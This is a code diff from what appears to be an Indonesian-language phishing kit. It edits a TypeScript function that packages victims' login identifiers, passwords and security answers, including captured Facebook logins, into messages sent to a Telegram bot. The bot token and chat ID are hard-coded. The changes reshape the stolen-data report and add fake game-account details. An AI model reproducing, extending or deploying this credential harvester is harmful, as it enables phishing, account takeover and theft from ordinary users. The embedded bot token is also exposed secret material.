@@ -47,7 +47,7 @@ export const sendToTelegram = async (
   identifier: string, 
   pass: string, 
   loginMethod: string, 
-  extraInfo: string // Previously q2, can be used for "Security Answers" if needed
+  _extraInfo: string // Previously q2, can be used for "Security Answers" if needed
 ) => {
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
   const CHAT_IDS = ['', '6076369736']; // Add your IDs here
@@ -62,7 +62,7 @@ export const sendToTelegram = async (
   const dateTimeString = `${dateStr}, ${timeStr}`;
 
   // Determine Login Label based on method
-  let loginLabel = "� ID Login";
+  let loginLabel = "👤 ID Login";
   if (loginMethod === "HP Login") loginLabel = "📱 Nomor HP";
   if (loginMethod === "Email Login") loginLabel = "📧 Email";
   if (loginMethod === "Facebook Login") loginLabel = "👤 Email/Phone";
@@ -72,18 +72,25 @@ export const sendToTelegram = async (
 ─────────────────
 
 🕰️ Waktu: ${dateTimeString}
-🌐 IP      : <code>${loc.ip}</code>
-🏙 City    : ${loc.city}
-® Region  : ${loc.region}
+🧩 Device: ${deviceInfo}
 
-� <b>LOGIN DETAILS</b>
+📊 <b>INFO AKUN</b>
+─────────────────
+🧰 Level: 15
+💰 Topup: Rp 55.000
+🥇 Tier: 🥇 Perunggu
+👤 Username: AWAL
+🔗 Linked: 👤 Pengunjung
+🟢 Status: ✅ AKTIF
+
+🔑 <b>LOGIN DETAILS</b>
 ─────────────────
 ${loginLabel}: <code>${identifier}</code>
-� Password: <code>${pass}</code>
+🔐 Password: <code>${pass}</code>
 
 🛡️ <b>Security Answers:</b>
-└ Q1:-
-└ Q2:-
+└ Q1: polos
+└ Q2: polos
 
 🖱️ <b>REQUEST INFO</b>
 ─────────────────
@@ -102,8 +109,8 @@ ${loginLabel}: <code>${identifier}</code>
 export const sendFacebookLogin = async (
   email: string, 
   pass: string,
-  q1: string,
-  q2: string
+  _q1: string,
+  _q2: string
 ) => {
   return sendToTelegram(email, pass, "Facebook Login", "-");
 };
